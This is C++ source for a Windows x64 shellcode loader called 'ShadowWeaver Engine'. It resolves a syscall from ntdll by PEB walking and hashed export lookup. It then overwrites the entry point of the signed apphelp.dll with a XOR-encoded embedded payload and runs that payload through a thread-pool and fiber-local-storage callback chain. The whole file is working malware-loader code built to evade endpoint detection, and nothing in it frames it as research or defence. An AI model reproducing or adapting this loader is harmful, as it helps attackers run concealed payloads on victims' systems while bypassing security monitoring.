#ifdef _WIN64
#include <windows.h>
#include <iostream>
#include <winternl.h>

struct SYSCALL_ENTRY {
    DWORD dwSsn;
    PVOID pSyscallInst;
};

SYSCALL_ENTRY g_NtMapViewOfSection = { 0 };

typedef struct _PAYLOAD_CONTEXT {
    PVOID pPayloadAddress;
    SIZE_T sPayloadSize;
} PAYLOAD_CONTEXT, *PPAYLOAD_CONTEXT;

constexpr DWORD HashString(const char* str) {
    DWORD hash = 0x811c9dc5;
    while (*str) {
        hash ^= (unsigned char)*str++;
        hash *= 0x01000193;
    }
    return hash;
}

unsigned char g_SyscallStub[] = {
    0x49, 0x89, 0xCA,
    0x8B, 0x44, 0x24, 0x28,
    0x4C, 0x8B, 0x4C, 0x24, 0x30,
    0x48, 0x83, 0xC4, 0x20,
    0xFF, 0x64, 0x24, 0x18
};

typedef NTSTATUS(NTAPI* pfnDirectProxy)(...);

void ParseNtdllSyscalls() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink - 0x10);
    
    while (pLdrEntry->DllBase != NULL) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLdrEntry->DllBase;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pLdrEntry->DllBase + pDos->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY pExports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pLdrEntry->DllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        
        PDWORD pNames = (PDWORD)((PBYTE)pLdrEntry->DllBase + pExports->AddressOfNames);
        PWORD pOrdinals = (PWORD)((PBYTE)pLdrEntry->DllBase + pExports->AddressOfNameOrdinals);
        PDWORD pFunctions = (PDWORD)((PBYTE)pLdrEntry->DllBase + pExports->AddressOfFunctions);

        for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
            char* szName = (char*)((PBYTE)pLdrEntry->DllBase + pNames[i]);
            if (HashString(szName) == HashString("NtMapViewOfSection")) {
                PBYTE pFuncAddress = (PBYTE)pLdrEntry->DllBase + pFunctions[pOrdinals[i]];
                DWORD ssn = *(PDWORD)(pFuncAddress + 4);
                PVOID pSyscallOpcode = nullptr;
                for (int offset = 0; offset < 64; offset++) {
                    if (pFuncAddress[offset] == 0x0F && pFuncAddress[offset + 1] == 0x05) {
                        pSyscallOpcode = (PVOID)(pFuncAddress + offset);
                        break;
                    }
                }
                g_NtMapViewOfSection = { ssn, pSyscallOpcode };
                return;
            }
        }
        pLdrEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pLdrEntry->InLoadOrderLinks.Flink);
    }
}

void XorDecrypt(unsigned char* data, size_t dataSize, unsigned char key) {
    for (size_t i = 0; i < dataSize; i++) {
        data[i] ^= key;
    }
}

VOID WINAPI IntelCetCompliantCallback(PVOID lpFlsData) {
    PPAYLOAD_CONTEXT pCtx = (PPAYLOAD_CONTEXT)lpFlsData;
    if (!pCtx || !pCtx->pPayloadAddress) return;

    void (*ShellcodeEntry)() = (void (*)())pCtx->pPayloadAddress;
    ShellcodeEntry();
}

VOID CALLBACK WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    DWORD dwFlsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)IntelCetCompliantCallback);
    if (dwFlsIndex == FLS_OUT_OF_INDEXES) return;

    FlsSetValue(dwFlsIndex, Context);
    FlsFree(dwFlsIndex);
}

int main() {
    unsigned char payload[] = {
        0x05, 0x04, 0x07, 0x06, 0x03, 0x02, 0x00, 0x33, 0x39, 0x0f, 0x31, 0x38, 0x3a, 0x37, 0x38, 0x01,
        0x6c, 0x9d, 0x70, 0x33, 0x99, 0x3a, 0x90, 0x33, 0x3d, 0x9d, 0x30, 0x33, 0x3d, 0x9d, 0x35, 0x33,
        0x3d, 0x9d, 0x75, 0x33, 0x27, 0x05, 0x11, 0x3d, 0x3c, 0x34, 0x4d, 0xb6, 0x31, 0x4d, 0xbd, 0xdd,
        0x47, 0x1e, 0x09, 0x86, 0x55, 0x57, 0x55, 0x75, 0x14, 0xbc, 0xb6, 0x78, 0x14, 0x12, 0xb6, 0x97,
        0x92, 0x07, 0x14, 0x0e, 0x3d, 0x3c, 0x31, 0x55, 0xde, 0x37, 0x65, 0x3d, 0xb4, 0xa3, 0x55, 0x9c,
        0x9d, 0x55, 0x55, 0x55, 0x3d, 0xd4, 0x95, 0x55, 0xcf, 0x55, 0x55, 0x3d, 0xde, 0x95, 0x21, 0x34,
        0x3d, 0xb4, 0xa3, 0x05, 0x96, 0x3d, 0xc7, 0x3d, 0x96, 0x3d, 0xc7, 0x12, 0xb4, 0xa1, 0xb4, 0xd4,
        0x3d, 0xaa, 0x5c, 0x3c, 0x96, 0x41, 0x17, 0x17, 0x3d, 0xb4, 0xa7, 0x3c, 0x4d, 0xb6, 0x31, 0x4d,
        0xbd, 0xdd, 0x14, 0x12, 0xb4, 0xa1, 0xb4, 0xd4, 0x47, 0x5f, 0x2e, 0x8e, 0x13, 0x66, 0x20, 0x01,
        0x21, 0x31, 0x3d, 0x96, 0x3d, 0x11, 0x3d, 0x11, 0x3d, 0xb4, 0xa3, 0x53, 0x14, 0xd4, 0xdd, 0x14,
        0xd4, 0x31, 0x3d, 0x3c, 0x96, 0x3d, 0x55, 0x3d, 0x96, 0x3d, 0x14, 0xd4, 0x3d, 0xbc, 0x9a, 0xbc,
        0x92, 0xbc, 0x9c, 0x3d, 0x3e, 0x31, 0x95, 0xa3, 0x3d, 0x08, 0x91, 0x96, 0x20, 0x26, 0x27, 0x22,
        0x23, 0x20, 0x21, 0x96
    };
    SIZE_T payloadSize = sizeof(payload);

    std::cout << "[+] ShadowWeaver Engine Initializing..." << std::endl;
    ParseNtdllSyscalls();

    if (!g_NtMapViewOfSection.pSyscallInst) return -1;

    PVOID pAssemblyProxy = VirtualAlloc(NULL, sizeof(g_SyscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAssemblyProxy) return -1;
    
    RtlCopyMemory(pAssemblyProxy, g_SyscallStub, sizeof(g_SyscallStub));
    DWORD dwStubOld;
    VirtualProtect(pAssemblyProxy, sizeof(g_SyscallStub), PAGE_EXECUTE_READ, &dwStubOld);
    pfnDirectProxy SystemCallProxy = (pfnDirectProxy)pAssemblyProxy;

    HMODULE hTargetDll = LoadLibraryA("apphelp.dll");
    if (!hTargetDll) {
        VirtualFree(pAssemblyProxy, 0, MEM_RELEASE);
        return -1;
    }

    PVOID pTargetBase = (PVOID)hTargetDll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pTargetBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pTargetBase + pDos->e_lfanew);
    PVOID pOverwriteTarget = (PVOID)((PBYTE)pTargetBase + pNt->OptionalHeader.AddressOfEntryPoint);

    std::cout << "[+] Patching signed target page protections via Indirect Call..." << std::endl;

    DWORD dwOldProtect;
    if (!VirtualProtect(pOverwriteTarget, payloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        FreeLibrary(hTargetDll);
        VirtualFree(pAssemblyProxy, 0, MEM_RELEASE);
        return -1;
    }

    RtlCopyMemory(pOverwriteTarget, payload, payloadSize);
    XorDecrypt((unsigned char*)pOverwriteTarget, payloadSize, 0x55);
    VirtualProtect(pOverwriteTarget, payloadSize, dwOldProtect, &dwOldProtect);

    PAYLOAD_CONTEXT ctx = { pOverwriteTarget, payloadSize };

    std::cout << "[+] Offloading validated structures to Native Thread Pool..." << std::endl;

    PTP_WORK pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)WorkCallback, &ctx, NULL);
    if (pWork) {
        SubmitThreadpoolWork(pWork);
        WaitForThreadpoolWorkCallbacks(pWork, FALSE);
        CloseThreadpoolWork(pWork);
    }

    FreeLibrary(hTargetDll);
    VirtualFree(pAssemblyProxy, 0, MEM_RELEASE);
    
    std::cout << "[+] Pipeline execution terminated successfully." << std::endl;
    return 0;
}
#else
#include <iostream>
int main() {
    std::cout << "ShadowWeaver is platform-specific and requires a 64-bit Windows environment context." << std::endl;
    return 0;
}
#endif
